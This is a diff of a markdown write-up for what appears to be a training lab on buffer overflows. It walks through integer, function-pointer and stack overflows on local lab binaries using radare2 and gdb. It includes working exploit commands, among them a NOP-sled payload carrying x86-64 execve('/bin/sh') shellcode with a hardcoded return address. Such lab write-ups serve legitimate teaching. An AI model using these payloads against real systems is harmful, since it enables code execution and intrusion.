@@ -344,9 +344,7 @@ Using contents first of overflow-1 folder
 
 ```
 overflow-1]$ ls -la
-total 16
-drwxrwxr-x 2 user1 user1   48 Sep  2  2019 .
-drwx------ 7 user1 user1  169 Nov 27  2019 ..
+...
 -rwxrwxr-x 1 user1 user1 8224 Sep  2  2019 int-overflow
 -rw-rw-r-- 1 user1 user1  291 Sep  2  2019 int-overflow.c
 ```
@@ -354,7 +352,7 @@ drwx------ 7 user1 user1  169 Nov 27  2019 ..
 Its actually compiled closer look at the file shows its listed as not stripped meaning the debugging information and functions are not removed.
 
 ```
-[user1@ip-10-49-147-85 overflow-1]$ file int-overflow
+overflow-1]$ file int-overflow
 int-overflow: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 3.2.0, BuildID[sha1]=847268d010c1aa1403e55a8891fc94d05b7ed123, not stripped
 ```
 
@@ -372,7 +370,7 @@ Radare2 is mentioned in the first section but up to this point is not even menti
 Note radare2 and gbd are installed on the attack box for use.
 
 ```
-[user1@ip-10-49-147-85 overflow-1]$ radare2 int-overflow
+overflow-1]$ radare2 int-overflow
  -- The Hard ROP Cafe
 [0x00400450]> aaa  
 [x] Analyze all flags starting with sym. and entry0 (aa)
@@ -408,7 +406,7 @@ Next 'afl' to display the functions:
 View code if desired just wanted to see what error was but its just warning.
 
 ```
- overflow-1]$ cat int-overflow.c
+overflow-1]$ cat int-overflow.c
 #include <stdlib.h>
 #include <unistd.h>
 #include <stdio.h>
@@ -434,24 +432,22 @@ The variable line 'char buffer[14];' pretty much tells me 14 is going to be the 
 32 bytes → Overflow + Segfault - this overwrites the the return address by one byte, 31 avoids it
 15 bytes → Overflow (variable changed)
 
-Example of 14 A's
-
+Example of 14 A's no segmentation fault, within range
 ```
-[user1@ip-10-49-129-36 overflow-1]$ ./int-overflow 
+overflow-1]$ ./int-overflow 
 AAAAAAAAAAAAAA
 Try again?
 ```
 
-What 32
-
+32 A's segmentation fault, overflows out of variable
 ```
-[user1@ip-10-49-129-36 overflow-1]$ ./int-overflow 
+overflow-1]$ ./int-overflow 
 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 You have changed the value of the variable
 Segmentation fault
 ```
 
-Success with 15 A's
+Success with 15 A's after variations tried
 
 ```
 [user1@ip-10-49-129-36 overflow-1]$ ./int-overflow 
@@ -502,7 +498,7 @@ Similar to the example in task 6, data is read into a buffer using the gets func
 
 Keep in mind that the architecture of this machine is little endian!
 
-First of the endian is right at the start of 'file' command results:
+First off the endian is right at the start of 'file' command results:
 
 ```
 overflow-2]$ file func-pointer
@@ -624,9 +620,12 @@ python -c 'print("A"*14 + "\x67\x05\x40\x00\x00\x00\x00\x00")' | ./func-pointer
 ### Q1 Task 7: Invoke the special function: Answer: You should see: 
 
 ```
-[... overflow-2]$ python --version
+overflow-2]$ python --version
 Python 2.7.18
-[... overflow-2]$ python -c 'print("A"*14 + "\x67\x05\x40\x00\x00\x00\x00\x00")' | ./func-pointer
+
+# Python2 not 3
+
+overflow-2]$ python -c 'print("A"*14 + "\x67\x05\x40\x00\x00\x00\x00\x00")' | ./func-pointer
 this is the special function
 you did this, friend!
 ```
@@ -640,7 +639,7 @@ This should have similarity to the Task 7.
 First off this is the code we will be working with:
 
 ```
-[...overflow-3]$ cat buffer-overflow.c
+overflow-3]$ cat buffer-overflow.c
 #include <stdio.h>
 #include <stdlib.h>
 
@@ -789,35 +788,24 @@ python -c 'print(
 
 Where:
 
-NOP_COUNT = number of \x90 bytes (e.g. 30, 50, 100…)
-
-PADDING = bytes to fill up to the saved return address
-
-<return address in little-endian> = an address somewhere in the NOP sled region (e.g. start of buffer)
-
-Where is return address obtained from:
-
-From 'gbd' or 'radare2 -d' 
+- NOP_COUNT = number of \x90 bytes (e.g. 30, 50, 100…)
+- PADDING = bytes to fill up to the saved return address
+- <return address in little-endian> = an address somewhere in the NOP sled region (e.g. start of buffer)
+- Where is return address for buffer char variable obtained from 'gbd' or 'radare2 -d' by finding the runtime address of the buffer inside copy_arg().
+```
 \xAA\xBB\xCC\xDD\xEE\xFF\x00\x00
-by finding the runtime address of the buffer inside copy_arg().
+```
 
-- That address is not known from the C code.
-- It is not printed by the program.
-- It is not in the binary.
+## This is how all classic stack‑based shellcode exploits work. Example:
 
-It is only known at runtime, so you must get it from:
-- gdb  
-or
-- radare2 -d
-
-This is how all classic stack‑based shellcode exploits work.
-
-## example:
+Where Offset to RIP is 152 + 8 bytes for overflow of return address into the RIP section
 
 NOP_COUNT = 100 "\x90" * 100
 PADDING=12 bytes -> "A" * 12
-shellcode = 30 bytes
+shellcode = 40 bytes
 <return address> = 8 bytes
+-----------------------------
+Total payload size = 160 bytes
 
 ```
 overflow-3]$ ./buffer-overflow $(python -c "print '\x90'*100 + '\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05' + 'A'*12 + '\xc0\xe2\xff\xff\xff\x7f\x00\x00'")
@@ -825,15 +813,9 @@ overflow-3]$ ./buffer-overflow $(python -c "print '\x90'*100 + '\x6a\x3b\x58\x48
 
 ## That was example but we need to obtain the return address for buffer:
 
-Starting from the overflow-3 folder
-```
-overflow-3]$ ls
-buffer-overflow    secret.txt
-buffer-overflow.c
-```
 start the radare2 on script running:
 ```
-[user1@ip-10-49-146-85 overflow-3]$ radare2 -d ./buffer-overflow
+overflow-3]$ radare2 -d ./buffer-overflow
 Process with PID 18104 started...
 = attach 18104 18104
 bin.baddr 0x00400000
@@ -931,10 +913,10 @@ Note:
 The payload you need should be:
 152 for binary to RIP + 8 for the return address
 
-NOP sled:      100 bytes
-Shellcode:      40 bytes
-Padding:        12 bytes
-Return address:  8 bytes
+NOP sled:      100 bytes    -> '/x90'*100
+Shellcode:      40 bytes    -> '\x6a\x3b\x58\x48\x31\....
+Padding:        12 bytes    -> 'A'*12
+Return address:  8 bytes    ->  \xd0\xe2\xff\xff\xff\x7f\x00\x00
 --------------------------------
 Total:         160 bytes
 
